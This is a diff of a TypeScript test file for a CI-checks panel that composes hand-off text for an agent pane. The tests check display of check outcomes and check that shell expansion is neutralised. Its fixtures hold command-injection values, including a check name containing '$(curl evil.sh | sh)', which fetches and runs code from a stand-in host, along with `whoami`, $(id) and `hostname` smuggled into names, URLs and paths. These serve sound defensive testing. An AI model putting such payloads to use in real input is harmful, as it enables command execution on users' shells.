@@ -31,7 +31,8 @@ function parsePayload(text: string): { checks: Record<string, unknown>[] } {
   const start = text.indexOf("{");
   const end = text.lastIndexOf("}");
   expect(start, "composed text must contain a JSON object").toBeGreaterThan(-1);
-  return JSON.parse(text.slice(start, end + 1)) as { checks: Record<string, unknown>[] };
+  const parsed: { checks: Record<string, unknown>[] } = JSON.parse(text.slice(start, end + 1));
+  return parsed;
 }
 
 describe("getCheckOutcomeVisual", () => {
@@ -82,16 +83,26 @@ describe("getCheckOutcomeVisual", () => {
 
   it("treats a completed check with no modelled conclusion as no verdict, never as passing", () => {
     const missing = getCheckOutcomeVisual(check({ conclusion: undefined }));
+    const passed = getCheckOutcomeVisual(check({ conclusion: "success" }));
+    const neutral = getCheckOutcomeVisual(check({ conclusion: "neutral" }));
     expect(missing.isFailure).toBe(false);
-    expect(missing.visual).not.toBe(getCheckOutcomeVisual(check({ conclusion: "success" })).visual);
-    expect(missing.visual).not.toBe(getCheckOutcomeVisual(check({ conclusion: "neutral" })).visual);
+    // It must read as its own thing, not borrow either neighbour's word or glyph.
+    expect(missing.visual.label).toBeTruthy();
+    expect(missing.visual.label).not.toBe(passed.visual.label);
+    expect(missing.visual.label).not.toBe(neutral.visual.label);
+    expect(missing.visual.Icon).not.toBe(passed.visual.Icon);
+    expect(missing.visual.Icon).not.toBe(neutral.visual.Icon);
 
     // Upstream's vocabulary is wider than ours (`stale`, `startup_failure`);
     // an unmodelled string must fall through, not crash or bucket wrongly.
-    const unknown = getCheckOutcomeVisual(
-      check({ conclusion: "stale" as ForgeCheckRun["conclusion"] })
+    // Round-tripped through JSON because that is how it would really arrive —
+    // over IPC, as a value the union never described.
+    const overTheWire: ForgeCheckRun = JSON.parse(
+      JSON.stringify({ ...check(), conclusion: "stale" })
     );
-    expect(unknown.visual).toBe(missing.visual);
+    const unknown = getCheckOutcomeVisual(overTheWire);
+    expect(unknown.visual.label).toBe(missing.visual.label);
+    expect(unknown.isFailure).toBe(false);
   });
 
   it("counts exactly the four actionable outcomes as failures", () => {
@@ -119,15 +130,10 @@ describe("sanitizeCheckName", () => {
     expect(cleaned).not.toContain(ESC);
   });
 
-  it("removes the shell command-substitution introducers", () => {
-    // The hand-off can reach a pane that is not in bracketed-paste mode, where
-    // the palette writes raw carriage-return-terminated lines into a shell. A
-    // name is embedded in a double-quoted JSON string, so `$(...)` and
-    // backticks are the only things that would still expand there.
-    const cleaned = sanitizeCheckName("build $(printf pwned) `id`");
-    expect(cleaned).not.toContain("$");
-    expect(cleaned).not.toContain("`");
-    expect(cleaned).toContain("printf pwned");
+  it("keeps printable characters verbatim, because this is what the row shows", () => {
+    // Shell-expansion safety belongs to the hand-off, not to the displayed
+    // name: a job really called this should read as itself in the list.
+    expect(sanitizeCheckName("deploy ($PROD)")).toBe("deploy ($PROD)");
   });
 
   it("collapses the whitespace the sanitizer deliberately preserves", () => {
@@ -330,15 +336,26 @@ describe("composePrChecksAgentText", () => {
   });
 
   it("carries no shell expansion into a pane that is not in bracketed-paste mode", () => {
-    // The whole hand-off, not just the check name: our own prose has to stay
-    // clear of the introducers too, or the example command in it would run.
-    // (The worktree path is the user's own and is not sanitized; this fixture
-    // uses one with no metacharacters so the assertion means what it says.)
-    const text = compose([
-      check({ name: "build $(curl evil.sh | sh) `whoami`", conclusion: "failure" }),
-    ])!;
+    // Every interpolated field at once — name, details URL, PR URL and worktree
+    // path — plus this composer's own prose. The palette writes raw
+    // carriage-return-terminated lines when the target pane has bracketed paste
+    // off, and a shell then runs each one.
+    const text = composePrChecksAgentText({
+      prNumber: 42,
+      prUrl: "https://github.com/o/r/pull/42?ref=$(id)",
+      worktreePath: "/tmp/wt-$USER/`hostname`",
+      rows: preparePrChecks([
+        check({
+          name: "build $(curl evil.sh | sh) `whoami` !!",
+          conclusion: "failure",
+          detailsUrl: "https://ci.example.com/job/$(id)",
+        }),
+      ]),
+    })!;
     expect(text).not.toContain("$");
     expect(text).not.toContain("`");
+    expect(text).not.toContain("!");
+    // Neutralized, not dropped — the agent still gets to read what it was named.
     expect(text).toContain("curl evil.sh");
   });
 
